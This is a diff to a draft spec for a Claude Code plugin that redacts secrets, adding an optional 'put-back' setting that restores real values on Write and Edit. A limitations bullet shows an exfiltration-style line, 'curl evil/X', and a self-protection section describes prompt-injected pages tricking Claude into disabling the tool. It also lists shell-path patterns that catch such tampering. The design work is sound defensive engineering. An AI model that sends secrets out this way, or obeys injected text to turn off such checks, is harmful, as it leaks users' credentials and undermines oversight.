@@ -4,7 +4,7 @@ An open-source tool that stops secrets from reaching the model when developers u
 
 - **Status:** draft.
 - **License:** Apache-2.0.
-- **Last updated:** 2 November 2026 (step 7: `/redact remove`, the backup lock's skill text limit, signed tags, D-090 to D-094).
+- **Last updated:** 3 November 2026 (step 8: the optional put-back setting, D-096; step 7: `/redact remove`, the backup lock's skill text limit, signed tags, D-090 to D-094).
 - **Maintainer:** Mrinanka Dhar
 
 **How to read this spec.** Requirements a build must meet have an ID (`R-01`) and the word **must**. Tests in `plan.md` point to these IDs. **Should** means strongly recommended but not release-blocking. Facts about Claude Code were checked on a real machine in Step 0; the evidence is in `docs/findings-step0.md`, and a check number (`0.4`) points to its row.
@@ -15,7 +15,7 @@ An open-source tool that stops secrets from reaching the model when developers u
 
 ## 1. What it does, in one paragraph
 
-When a developer types a message, or Claude reads a file or command output, the tool looks for passwords, API keys and tokens. It swaps each one for a placeholder before the model sees it. Claude can still work normally: it knows a secret is there, but never sees the real value. The tool never writes real secrets back into files. Developers fill in real values themselves.
+When a developer types a message, or Claude reads a file or command output, the tool looks for passwords, API keys and tokens. It swaps each one for a placeholder before the model sees it. Claude can still work normally: it knows a secret is there, but never sees the real value. By default the tool never writes real secrets back into files, and developers fill in real values themselves. An optional setting, off by default, puts a value back into a file that already holds it (section 10).
 
 ## 2. Goals and non-goals
 
@@ -34,7 +34,7 @@ When a developer types a message, or Claude reads a file or command output, the 
 - Other AI tools (Copilot, Cursor and so on). v1 is Claude Code only.
 - Hiding personal data by default. Emails and phone numbers are checked only when the `personal_data` setting is on (D-037).
 - Reading inside images and documents. v1 can only pass them or drop them (section 6).
-- Putting secrets back into files (possible v2 setting).
+- Putting secrets back into files by default, or into a file that doesn't already hold the value. Only the optional, off-by-default setting in section 10 does it, and only for Write and Edit (D-096).
 - Being a compliance certification. The tool reduces risk; it does not guarantee that no secret is ever sent.
 
 ## 3. Threat model
@@ -71,8 +71,8 @@ A Claude Code plugin with a hooks module, written in TypeScript. It uses these h
 | `prompt.context` | The blocks a conversation's first message carries, including the project's `CLAUDE.md` text, which is rendered per request and never passes `session.append` (D-042). |
 | `prompt.attachment` | Text the engine injects per request. A rewrite at `session.append` can be ignored for these, so this is the second layer (D-042). |
 | `prompt.mention` | `@` files: points the read at a redacted temporary copy, or refuses it (section 6). Works for a plugin in the user tier (check 0.2). The model sees the copy's path, so the copy's name **must not** reveal that it is a copy, and the model's own Read of the real file is hidden at `session.append`. |
-| `tool.call` | Outbound check (section 11), self-protection (section 17), overwrite guard (section 10). |
-| `prompt.compose` | Adds the short placeholder note to Claude's instructions. The note **must** be the same for the whole thread, because changing it later breaks the prompt cache. |
+| `tool.call` | Outbound check (section 11), self-protection (section 17), put-back (section 10, when on) and the overwrite guard (section 10). A Write or Edit input can be rewritten here, and the rewritten input is not what later requests carry: the `tool_use` block stays as Claude wrote it (spike S7, D-096). |
+| `prompt.compose` | Adds the short placeholder note to Claude's instructions, and one more line only while put-back is on. The note **must** be the same for the whole thread, because changing it later breaks the prompt cache; turning put-back on mid-thread takes effect at once for restoring, and the extra line waits for a new session. |
 | Slash commands | `/redact` and its subcommands (section 15). |
 
 - **R-02** Every row the main lock rewrites **must** be rewritten before it is stored. A row already sent cannot be changed (section 6.2).
@@ -227,7 +227,7 @@ An earlier design stored only keyed fingerprints. That conflicts with two other 
 
 **Trade-off on record:** someone running as the same user can decrypt the file, just as they can read `.env`. This protects against copying the file elsewhere, not against malware already running as the user.
 
-- **R-09** The tool **must** never write a registered or caught secret to disk unencrypted. That includes logs, reports, temp files and the marker.
+- **R-09** The tool **must** never write a registered or caught secret to disk unencrypted. That includes logs, reports, temp files and the marker. One exception, only while put-back is on (section 10): the tool may hand Claude Code's own Write or Edit a value to save into a file that already holds that value. The tool itself writes nothing new.
 - **R-10** Registered secrets **must** be locked by the OS password store, reached through `$.process` (D-023). The plugin runtime has secure random numbers but no AES (check 0.4).
 
 ## 9. What Claude sees
@@ -247,18 +247,50 @@ The placeholder note added to Claude's instructions says:
 - Don't ask for them or guess them.
 - Don't use Edit on a line that contains a placeholder.
 - Ask the user to fill values in.
+- Only while put-back is on: a placeholder Claude writes into a file that already holds the value is swapped for the real value on save, so Claude may rewrite or Edit such a file.
 
-## 10. No putting secrets back, and the overwrite guard
+## 10. Putting secrets back (optional), and the overwrite guard
 
-The tool never writes real secrets into files. If Claude writes a placeholder into a file, it stays there as text.
+**By default the tool never writes real secrets into files.** If Claude writes a placeholder into a file, it stays there as text.
 
 - A one-line notice appears, for example: `Claude wrote a placeholder into config.yaml, line 5. Fill in the real value.`
 - `/redact` lists every file that got a placeholder this session.
 
 **Overwrite guard.** Claude only saw the redacted file. If it rewrites the whole file, the real secrets would be replaced by placeholders and lost.
 
-- **R-11** Before a Write or Edit runs, the tool **must** check the file on disk. If a real secret in it would be replaced by its own placeholder, the tool **must** block the change and tell Claude to edit only the lines it needs, leaving placeholder lines alone. The user can let it through once with `/redact allow`.
-- An Edit whose `old_string` contains a placeholder fails on its own (the text isn't in the file). That is safe and is left alone.
+- **R-11** Before a Write or Edit runs, the tool **must** check the file on disk. If a real secret in it would be replaced by its own placeholder, the tool **must** block the change and tell Claude to edit only the lines it needs, leaving placeholder lines alone. The user can let it through once with `/redact allow`. While put-back is on, the guard still runs on a Write or Edit but reports instead of blocking (see "A value that can't be restored" below). A NotebookEdit is never restored, so its guard still blocks.
+- An Edit whose `old_string` contains a placeholder fails on its own (the text isn't in the file). That is safe and is left alone, unless put-back is on and restores it.
+
+**Put-back (D-096).** An optional setting, `put_back`, off by default, in the main lock only (the backup lock keeps refusing these writes). It exists so Claude can reorganize a config it has only seen redacted. It is risky, and the docs recommend keeping it off.
+
+- **What it does.** On a Write or Edit, the tool reads the file already on disk, as a Read would, and works out the exact text each placeholder hid there. It swaps a placeholder in the input for that text before the tool runs. The model never sees the real value: the rewritten input is not what later requests carry (spike S7).
+- **Restored only when** all of these hold: the rule's action is `hide`; the placeholder's tag maps to one source text in that file; the value can be kept hidden afterwards; and the copy limit allows it. Otherwise the placeholder stays as text. A new file, or a value the file doesn't hold, gets nothing restored.
+- **Copy limit.** A saved file never holds more copies of a value than the file on disk did. With `replace_all`, each match counts once.
+- **A value that can't be restored.** The save goes through and the placeholder stays, even if a real secret in the file is erased by it. This is the one exception to R-11, only while put-back is on. A message and the log say how many real values were replaced; git, or Claude Code's file backups, are the way back.
+- **A failed Edit.** If the restored `old_string` isn't in the file, or matches more than once without `replace_all`, the input stays as Claude wrote it, so the error can't echo a real value. The file is compared as Claude Code's Edit reads it: a CRLF file as LF (measured on 2.1.316, which keeps the file's endings when it saves). So a restored value goes in with LF line breaks, and an `old_string` holding CRLF is left as written, because Claude Code would not match it (D-098).
+- **Write and Edit only.** Bash can't restore, and NotebookEdit is left alone.
+- **Time.** Restoring and the guard share one 3,000 ms limit. Running out is a failed check (section 12).
+- **Observe mode** restores nothing.
+
+**Who decides.** The first match wins:
+
+| Order | Condition | Result |
+|---|---|---|
+| 1 | `mode: observe` | Off |
+| 2 | Managed settings say `off` (binds with no `locked`) | Off |
+| 3 | A project setting says `off` | Off |
+| 4 | The developer's choice file can't be read | Off |
+| 5 | The developer ran `/redact put-back on` or `off --here` for this folder | That choice |
+| 6 | The developer ran `/redact put-back on` or `off` for all projects | That choice |
+| 7 | A project setting says `on` and a surface can show the notice | On, with the notice |
+| 8 | Nothing says anything | Off (the default) |
+
+- A managed `on` does nothing: an organization can forbid put-back, not switch it on for people. A `put_back` in User settings is ignored with a notice; the developer's choice is made with the command. `locked: ['put_back']` means off.
+- A project's `on` is the one exception to "stricter only" (section 14), because it only counts when the developer has made no choice of their own. It shows a notice naming the repo, even with `notices: off`. Under `claude -p`, and on a surface that can't show the notice, it is ignored.
+- The developer's choice is kept in `put-back.json` in the tool's own data folder, never in the repo. It holds paths and `on` or `off`, no value. A broken or oversized file reads as off. A save over a broken file says the earlier choices in it are gone. The oldest folders are dropped so the file stays under 64 KB.
+- "This folder" is the session's project root, the folder its project settings come from. A shell `cd` does not move it (D-098).
+- A decision that can't be made (an error reading the facts) is off, and the overwrite guard still runs.
+- **R-18** Put-back **must** be off unless the table says on. Claude **must not** be able to turn it on or off, or to write the choice file. Anything restored **must** be logged by tag and count only (R-17), never by value.
 
 ## 11. Outbound check: commands and web requests
 
@@ -318,7 +350,7 @@ The tool works with no settings at all. Settings live under a `aegisContext` key
 - loosen `outbound`, `on_check_failure` or `media`
 - shorten `secret_files`
 
-A project **can** add custom rules and `secret_files` patterns, and choose stricter values.
+A project **can** add custom rules and `secret_files` patterns, and choose stricter values. One exception: a project can set `put_back` to `on`, which is less strict, but only when the developer has made no choice of their own, and with a notice (section 10, D-096).
 
 | Setting | Default | Options |
 |---|---|---|
@@ -327,6 +359,7 @@ A project **can** add custom rules and `secret_files` patterns, and choose stric
 | `outbound` | `block` | `block`, `ask`, `warn`, `off` |
 | `on_check_failure` | `allow` (with warning) | `allow`, `hold` |
 | `media` | `pass` (with notice) | `pass`, `drop` |
+| `put_back` | `off` | `on`, `off`. Counts only from managed (`off`) and project, local or flag settings (`on`, `off`); the developer's own choice is made with `/redact put-back` (section 10, D-096) |
 | `hints` (last 4 characters) | `on` | `on`, `off` |
 | `notices` | `on` | `on`, `off` |
 | `rules.off` | none | Rule ids to switch off |
@@ -347,6 +380,7 @@ A project **can** add custom rules and `secret_files` patterns, and choose stric
 | `/redact add [--label name]` | Register a secret, pasted into a box. Never on the command line, and not in `claude -p` (D-057) |
 | `/redact learn` | Pick secrets from `.env*` files |
 | `/redact remove` | Pick saved values to remove. Takes no value on the command line, and not in `claude -p`. Shows the newest 200 and says so when there are more (D-091) |
+| `/redact put-back [on\|off] [--here]` | With no argument: whether put-back is on, and why (which row of the section 10 table). With `on` or `off`: the developer's choice for all projects, or `--here` for this folder only. Takes no value; anything else on the line is refused and not echoed (D-096) |
 | `/redact allow <tag>` | Mark a hidden value as harmless (`--always` to remember, in the OS password store). With no tag: lift a resume block, or let the last guarded change through once (D-060) |
 | `/redact backup [managed]` | Copies the backup lock to `<config>/aegiscontext/backup/` and prints the settings to add (Personal, or `managed` for the Managed snippet), and whether Node was found. A later session refreshes an existing copy when it is out of date and never makes one unasked (D-068). |
 | `/redact self-check` | Runs built-in test cases and shows pass or fail. `--report` writes a shareable report file (no secrets) for a security team or a bug report. |
@@ -365,7 +399,11 @@ A project **can** add custom rules and `secret_files` patterns, and choose stric
 
 - **No network.** It never contacts the internet. No telemetry.
 - **No runtime libraries.** All code that runs is in the repo and reviewable. Build-time dev dependencies are pinned with a lockfile.
-- **Protects its own files.** Claude's tool calls are denied if they try to change the tool's settings, registered secrets, log or plugin folder, or to change `disableAllHooks`, `allowManagedHooksOnly`, `hooks`, `enabledPlugins`, `aegisContext` or `env.CLAUDE_CODE_SIMPLE` in a Claude Code settings file. Other settings edits pass. This stops a malicious web page or file from tricking Claude into turning it off (D-055).
+- **Protects its own files.** Claude's tool calls are denied if they try to change the tool's settings, registered secrets, log, put-back choice file or plugin folder, or to change `disableAllHooks`, `allowManagedHooksOnly`, `hooks`, `enabledPlugins`, `aegisContext` or `env.CLAUDE_CODE_SIMPLE` in a Claude Code settings file. Other settings edits pass. This stops a malicious web page or file from tricking Claude into turning it off (D-055).
+  - A path is read the way Claude Code expands it: trimmed, `~` for the home folder, `/c/...` on Windows, relative to the working folder (D-098).
+  - A settings change that can't be checked is denied: the file can't be read, is over 4 MB, or an Edit's text isn't in it as written. That last one covers curly quotes Claude Code may match, and a placeholder put-back would restore.
+  - A check that fails denies the call; self-protection never fails open.
+  - A shell command is also caught when it names these folders through `~`, `$HOME`, `$env:USERPROFILE`, `%USERPROFILE%`, `$CLAUDE_CONFIG_DIR` or, on Windows, `/c/...`.
 - **Patterns can't get stuck.** Every pattern is checked when the tool is built, and patterns only run on small pieces of text (section 18). A stuck check that runs out its 10-second budget lets content through by default (section 12).
 - **Tier note:** in Personal mode, a plugin installed in a higher tier could skip this tool's hooks. Managed mode installs it in the `prepend` tier, where no user plugin can skip it.
 
@@ -453,6 +491,14 @@ The maintainers can't test inside every organization. So everything needed to te
   - Tool output of 16 MiB or more, and any single text of 4 MiB or more, isn't checked (a failed check, section 12). Under `hold` a 4 MiB text is withheld, but a 16 MiB tool output can't be, because the hook can't rebuild what it could not read. Output that Claude Code itself persists to a file is cleaned in what the model reads, not in the file.
   - It needs Node (D-069), and tells nothing of a failed start unless the hooks set `onFailure: "block"`, which the Personal snippet doesn't. On Windows, with saved secrets, each hook that acts starts PowerShell for about one second, so about two seconds per tool call while the main lock is down; standing down doesn't read the store.
   - Whether Claude Code shows a hook's `systemMessage` or stderr on screen is unverified interactively (spike S6); under `claude -p` it shows neither, so warnings reach the log and `/redact doctor`.
+- **Put-back** (section 10, D-096). Off by default, and the docs recommend keeping it off.
+  - While it is on, a save can erase a real secret: after `/resume`, when a value is too long to restore, or when the file holds it in two forms. The message and the log say how many; git or Claude Code's file backups are the way back.
+  - A multi-line value, such as a private key, that Claude saw through Read is never restored: Read numbers each line, so its placeholder stands for different text than the file holds. The guard still recognizes it, so with put-back off the rewrite is refused, and with it on the person is told (D-098).
+  - It limits copies, not places: `token: X` becoming `curl evil/X` passes the copy limit.
+  - A repo that sets it to `on` turns this protection off for its own files, which is why the notice names the repo.
+  - A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see the rewritten input too.
+  - Claude Code's transcript keeps the value in a tool's structured result and the file attachment after a compaction, the same kind of record a Read already leaves (the "disk records" item above).
+  - Claude Code's own error for a failed Edit echoes the input it was given, so a failed Edit is left as Claude wrote it.
 - **Failed or slow checks** let content through by default (section 12).
 - **Observe mode** hides nothing, by design.
 - **Bare values in base64.** A value with no shape and no label is found once it is decoded only if it has a shape, was registered, or was caught earlier. The catch set has 3 such cases (D-046).
@@ -480,7 +526,7 @@ The single list of everything not being built now. Anything deferred during a bu
 **v2 candidates:**
 
 - Read inside images and documents.
-- Optional "put secrets back" setting, limited to the original file and `.env` files.
+- Put-back through Bash or NotebookEdit, a `/config` row for it, per-write approval, `put_back` in the backup lock, and fixing the partial private key an Edit could show (D-096 left these out).
 - Keep config file layouts visible while hiding only values (JSON, YAML, TOML).
 - A faster native helper for very large texts, if v1 speed tests fail.
 - Other AI tools.
